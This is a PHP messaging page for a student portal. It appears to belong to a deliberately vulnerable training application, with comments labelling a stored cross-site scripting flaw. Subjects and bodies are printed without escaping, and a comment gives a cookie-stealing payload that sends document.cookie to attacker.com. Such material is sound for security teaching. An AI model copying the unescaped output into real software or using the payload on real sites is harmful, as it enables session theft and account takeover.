<?php
// public/portal/messages.php
// [VULNERABILITY: A03 - Stored XSS]
// Messages posted to the board are stored and rendered without sanitization

require_once __DIR__ . '/../../src/config/auth.php';
requireLogin();

$db   = getDB();
$user = getCurrentUser();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $subject   = $_POST['subject']   ?? '';
    $body      = $_POST['body']      ?? '';
    $recipient = $_POST['recipient'] ?? null;
    $isPublic  = isset($_POST['is_public']) ? 1 : 0;

    if (!empty($subject) && !empty($body)) {
        // [VULNERABILITY: A03 - Stored XSS]
        // Subject and body stored directly without htmlspecialchars/sanitization
        // Exploit payload in subject: <img src=x onerror="fetch('http://attacker.com/?cookie='+document.cookie)">
        // Exploit payload in body:    <script>alert(document.cookie)</script>
        $stmt = $db->prepare("INSERT INTO messages (sender_id, recipient_id, subject, body, is_public) VALUES (?, ?, ?, ?, ?)");
        $stmt->execute([$user['id'], $recipient ?: null, $subject, $body, $isPublic]);
        header('Location: /portal/messages.php?sent=1');
        exit;
    }
}

// Fetch public board messages
$publicMsgs = $db->query("
    SELECT m.*, u.full_name, u.student_id, u.role
    FROM messages m
    JOIN users u ON m.sender_id = u.id
    WHERE m.is_public = 1
    ORDER BY m.created_at DESC
    LIMIT 50
")->fetchAll(PDO::FETCH_ASSOC);

// Fetch private messages
$stmt = $db->prepare("
    SELECT m.*, u.full_name AS sender_name
    FROM messages m
    JOIN users u ON m.sender_id = u.id
    WHERE m.recipient_id = ?
    ORDER BY m.created_at DESC
");
$stmt->execute([$user['id']]);
$privateMsgs = $stmt->fetchAll(PDO::FETCH_ASSOC);

// Fetch all students for recipient selector
$students = $db->query("SELECT id, full_name FROM users WHERE id != {$user['id']}")->fetchAll(PDO::FETCH_ASSOC);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Messages | CAU Student Portal</title>
    <link rel="stylesheet" href="/css/main.css">
    <link rel="stylesheet" href="/css/portal.css">
    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=Source+Sans+Pro:wght@300;400;600&display=swap" rel="stylesheet">
</head>
<body class="portal-page">
<?php include __DIR__ . '/../../src/views/partials/portal_nav.php'; ?>

<div class="portal-layout">
    <?php include __DIR__ . '/../../src/views/partials/portal_sidebar.php'; ?>

    <main class="portal-main">
        <div class="portal-header">
            <h1>Campus Messaging</h1>
        </div>

        <?php if (isset($_GET['sent'])): ?>
        <div class="alert alert-success">✅ Your message was posted successfully.</div>
        <?php endif; ?>

        <div class="messages-layout">
            <!-- Compose Form -->
            <section class="portal-section compose-section">
                <h2>Post a Message</h2>
                <form method="POST" class="compose-form">
                    <div class="form-group">
                        <label for="recipient">To (leave blank for public board)</label>
                        <select name="recipient" id="recipient" class="form-select">
                            <option value="">📢 Public Board (all students)</option>
                            <?php foreach ($students as $s): ?>
                            <option value="<?php echo $s['id']; ?>"><?php echo htmlspecialchars($s['full_name']); ?></option>
                            <?php endforeach; ?>
                        </select>
                    </div>
                    <div class="form-group">
                        <label for="subject">Subject</label>
                        <!-- [VULNERABILITY: A03 - Stored XSS] No maxlength or sanitization hint -->
                        <input type="text" id="subject" name="subject" class="form-input"
                               placeholder="e.g. Study Group, Question about CS201...">
                    </div>
                    <div class="form-group">
                        <label for="body">Message</label>
                        <!-- [VULNERABILITY: A03 - Stored XSS] Rendered as raw HTML on display -->
                        <textarea id="body" name="body" rows="5" class="form-textarea"
                                  placeholder="Write your message here..."></textarea>
                    </div>
                    <div class="form-group">
                        <label class="checkbox-label">
                            <input type="checkbox" name="is_public" checked>
                            Post to public board (visible to all students)
                        </label>
                    </div>
                    <button type="submit" class="btn btn-primary">Send Message</button>
                </form>
            </section>

            <!-- Public Board -->
            <section class="portal-section">
                <h2>📢 Public Board</h2>
                <div class="message-board">
                <?php foreach ($publicMsgs as $msg): ?>
                    <div class="board-message">
                        <div class="board-msg-header">
                            <div class="msg-avatar-sm"><?php echo strtoupper(substr($msg['full_name'], 0, 1)); ?></div>
                            <div>
                                <strong><?php echo htmlspecialchars($msg['full_name']); ?></strong>
                                <span class="msg-role"><?php echo htmlspecialchars($msg['role']); ?></span>
                            </div>
                            <time><?php echo date('M d, g:i a', strtotime($msg['created_at'])); ?></time>
                        </div>
                        <div class="board-msg-subject">
                            <!-- [VULNERABILITY: A03 - Stored XSS] Subject rendered without escaping -->
                            <?php echo $msg['subject']; // [VULNERABILITY: A03 - XSS] ?>
                        </div>
                        <div class="board-msg-body">
                            <!-- [VULNERABILITY: A03 - Stored XSS] Body rendered without escaping -->
                            <?php echo $msg['body']; // [VULNERABILITY: A03 - XSS] ?>
                        </div>
                    </div>
                <?php endforeach; ?>
                </div>
            </section>

            <!-- Private Messages -->
            <?php if (!empty($privateMsgs)): ?>
            <section class="portal-section">
                <h2>📬 Private Messages</h2>
                <?php foreach ($privateMsgs as $msg): ?>
                <div class="board-message private">
                    <div class="board-msg-header">
                        <span>From: <strong><?php echo htmlspecialchars($msg['sender_name']); ?></strong></span>
                        <time><?php echo date('M d, g:i a', strtotime($msg['created_at'])); ?></time>
                    </div>
                    <div class="board-msg-subject"><?php echo $msg['subject']; ?></div>
                    <div class="board-msg-body"><?php echo $msg['body']; ?></div>
                </div>
                <?php endforeach; ?>
            </section>
            <?php endif; ?>
        </div>
    </main>
</div>
<script src="/js/portal.js"></script>
</body>
</html>
